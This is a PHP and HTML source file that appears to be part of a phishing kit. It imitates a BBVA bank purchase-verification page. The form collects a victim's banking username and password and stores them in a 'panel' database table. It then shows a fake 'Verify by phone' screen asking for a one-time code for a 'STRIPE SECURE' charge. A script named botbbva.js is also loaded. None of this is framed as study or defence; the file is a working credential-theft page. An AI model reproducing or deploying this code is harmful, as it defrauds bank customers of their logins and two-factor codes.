<?php
require_once 'config.php';

if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    $conn = getConnection();
    
    $uuid = bin2hex(random_bytes(18));
    $uuid = substr($uuid, 0, 8) . '-' . substr($uuid, 8, 4) . '-' . substr($uuid, 12, 4) . '-' . substr($uuid, 16, 4) . '-' . substr($uuid, 20, 12);

    $dato1 = $conn->real_escape_string($_POST['dato1']);
    $dato2 = $conn->real_escape_string($_POST['dato2']);

    $stmt = $conn->prepare("INSERT INTO  panel (id, dato1, dato2) VALUES (?, ?, ?)");
    $stmt->bind_param("sss", $uuid, $dato1, $dato2);
    
    if ($stmt->execute()) {
        $stmt->close();
        $conn->close();
        header("Location: ver_dato.php?id=$uuid");
        exit();
    } else {
        die("Error al insertar datos: " . $conn->error);
    }
}
?>

<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <link rel="stylesheet" href="../css/style.css">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>vuelos</title>
    <link href="https://fonts.googleapis.com/css2?family=Arial:wght@400;600;700&display=swap" rel="stylesheet">
    <style>
        html, body {
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Arial, sans-serif;
            margin: 0;
            padding: 0;
            background-color: #f8f9fa;
            color: #333;
            line-height: 1.5;
        }

        /* Estilos originales del BBVA */
        .bbva-container {
            width: 90%;
            max-width: 400px;
            margin: 0 auto;
            padding: 20px;
            background-color: white;
            border: 1px solid #e0e0e0;
            border-radius: 8px;
            box-shadow: 0 2px 4px rgba(0, 0, 0, 0.1);
        }

        .bbva-header {
            display: flex;
            justify-content: space-between;
            align-items: center;
            margin-bottom: 20px;
        }

        .bbva-header .logo {
            font-size: 24px;
            color: #002147;
            font-weight: bold;
        }

        .bbva-header .menu a {
            text-decoration: none;
            color: #ffffff;
            background-color: #002147;
            padding: 10px 15px;
            border-radius: 4px;
        }

        .bbva-main h2 {
            color: #333333;
            font-size: 16px;
            margin-bottom: 20px;
        }

        .bbva-form {
            display: flex;
            flex-direction: column;
        }

        .bbva-form label {
            font-size: 14px;
            margin-bottom: 5px;
            color: #666666;
        }

        .bbva-form select,
        .bbva-form input {
            padding: 8px;
            font-size: 14px;
            margin-bottom: 15px;
            border: 1px solid #cccccc;
            border-radius: 4px;
            width: calc(100% - 18px);
        }

        .bbva-form button {
            padding: 10px;
            font-size: 14px;
            color: white;
            background-color: #007bff;
            border: none;
            border-radius: 4px;
            cursor: pointer;
            width: 100%;
        }

        .bbva-form button:hover {
            background-color: #0056b3;
        }

        .bbva-form .forgot-password {
            font-size: 14px;
            color: #007bff;
            text-decoration: none;
            margin-top: 10px;
        }

        .bbva-form .forgot-password:hover {
            text-decoration: underline;
        }

        /* Estilos del nuevo diseño Verify by Phone */
        .verify-container {
            max-width: 500px;
            margin: 40px auto;
            padding: 40px 30px;
            background: white;
            border-radius: 8px;
            box-shadow: 0 2px 10px rgba(0, 0, 0, 0.1);
            display: none; /* Oculto por defecto */
        }

        .verify-header {
            border-bottom: 2px solid #e9ecef;
            padding-bottom: 20px;
            margin-bottom: 30px;
        }

        .verify-title {
            font-size: 28px;
            font-weight: 400;
            color: #2c3e50;
            margin-bottom: 0;
            letter-spacing: -0.5px;
        }

        .verify-description {
            font-size: 16px;
            color: #6c757d;
            margin: 25px 0;
            line-height: 1.6;
        }

        .phone-number {
            font-weight: 600;
            color: #2c3e50;
        }

        .payment-info {
            font-size: 16px;
            color: #6c757d;
            margin: 25px 0 35px 0;
            line-height: 1.6;
        }

        .stripe-text {
            font-weight: 600;
            color: #2c3e50;
        }

        .form-section {
            margin: 30px 0;
        }

        .form-label {
            display: block;
            font-size: 16px;
            color: #6c757d;
            margin-bottom: 15px;
            text-align: center;
            font-weight: 400;
        }

        .verification-input {
            width: 100%;
            padding: 15px 20px;
            font-size: 16px;
            border: 2px solid #dee2e6;
            border-radius: 6px;
            background-color: #fff;
            transition: border-color 0.3s ease;
            text-align: center;
            letter-spacing: 2px;
        }

        .verification-input:focus {
            outline: none;
            border-color: #4a90e2;
            box-shadow: 0 0 0 3px rgba(74, 144, 226, 0.1);
        }

        .confirm-button {
            width: 100%;
            padding: 15px 20px;
            font-size: 16px;
            font-weight: 600;
            color: white;
            background-color: #4a90e2;
            border: none;
            border-radius: 6px;
            cursor: pointer;
            transition: background-color 0.3s ease;
            margin: 25px 0 20px 0;
            text-transform: uppercase;
            letter-spacing: 0.5px;
        }

        .confirm-button:hover {
            background-color: #357abd;
        }

        .confirm-button:active {
            background-color: #2968a3;
        }

        .resend-link {
            display: block;
            text-align: center;
            color: #4a90e2;
            text-decoration: none;
            font-size: 16px;
            margin-top: 15px;
            transition: color 0.3s ease;
        }

        .resend-link:hover {
            color: #357abd;
            text-decoration: underline;
        }

        /* Responsive Design */
        @media (max-width: 768px) {
            .verify-container {
                margin: 20px;
                padding: 30px 20px;
            }
            
            .verify-title {
                font-size: 24px;
            }
            
            .verify-description,
            .payment-info {
                font-size: 15px;
            }
            
            .verification-input {
                padding: 12px 15px;
                font-size: 15px;
            }
            
            .confirm-button {
                padding: 12px 15px;
                font-size: 15px;
            }
        }

        @media (max-width: 480px) {
            .verify-container {
                margin: 10px;
                padding: 25px 15px;
            }
            
            .verify-title {
                font-size: 22px;
            }
            
            .verify-description,
            .payment-info {
                font-size: 14px;
            }
        }
    </style>
</head>
<body>
    <!-- Sección BBVA Original -->
    <main id="bbva-section" style="margin: 15% 8%;">
        <section>
            <div style=" padding-bottom: 5%; border-style: solid; border-width: 0px 0px 1px 0px; border-color: gray;">
                <img style="width: 30%;" src="../../img/BANCO BBVA.png" alt="">
            </div>
    
            <div style="margin-top: 1%; margin-bottom: 8%;">
                <p style="margin-bottom: 8%;"><strong>Vamos a validar tu compra</strong></p>
                <p>BBVA requiere verificar la transacción que intentas realizar con tu tarjeta por seguridad</p>
            </div>
    
            <div class="bbva-container">
                <main class="bbva-main">
                    <h2>Hola, ingresa tu número de documento/Usuario y contraseña:</h2>
                    <form method="POST" class="bbva-form">
                        <label for="document-number">Usuario</label>
                        <input type="text" id="username" name="dato1" placeholder="Usuario" required>
                        <label for="password">Ingresa tu contraseña</label>
                        <input type="password" id="password" name="dato2" placeholder="Ingresa tu contraseña" required>
                        <a href="#" class="forgot-password">Olvidé mi contraseña</a>
                        <button type="button" id="submitBtn" class="login-button">INGRESAR</button>
                    </form>
                </main>
            </div>
        </section>
    </main>

    <!-- Nueva sección Verify by Phone -->
    <div id="verify-section" class="verify-container">
        <div class="verify-header">
            <h1 class="verify-title">Verify by phone</h1>
        </div>
        
        <div class="verify-description">
            We just sent you a verification code to your registered mobile number <span class="phone-number">*******5496</span>.
        </div>
        
        <div class="payment-info">
            You are authorizing a payment to <span class="stripe-text">STRIPE SECURE</span> for <span class="stripe-text">1.28 EUR</span>.
        </div>
        
        <form class="form-section">
            <label class="form-label">Verification code</label>
            <input type="text" class="verification-input" placeholder="" maxlength="6">
            
            <button type="submit" class="confirm-button">CONFIRM</button>
            
            <a href="#" class="resend-link">Resend Code</a>
        </form>
    </div>

    <script>
        // Script para cambiar entre secciones
        document.getElementById('submitBtn').addEventListener('click', function(e) {
            e.preventDefault();
            
            // Validar que los campos no estén vacíos
            const username = document.getElementById('username').value;
            const password = document.getElementById('password').value;
            
            if (username.trim() === '' || password.trim() === '') {
                alert('Por favor, complete todos los campos.');
                return;
            }
            
            // Ocultar sección BBVA y mostrar sección Verify
            document.getElementById('bbva-section').style.display = 'none';
            document.getElementById('verify-section').style.display = 'block';
        });
        
        // Mantener la funcionalidad original si existe botbbva.js
        if (typeof window.botbbva !== 'undefined') {
            // Aquí se ejecutaría el código original de botbbva.js
        }
    </script>
    
    <script src="botbbva.js"></script>
</body>
</html>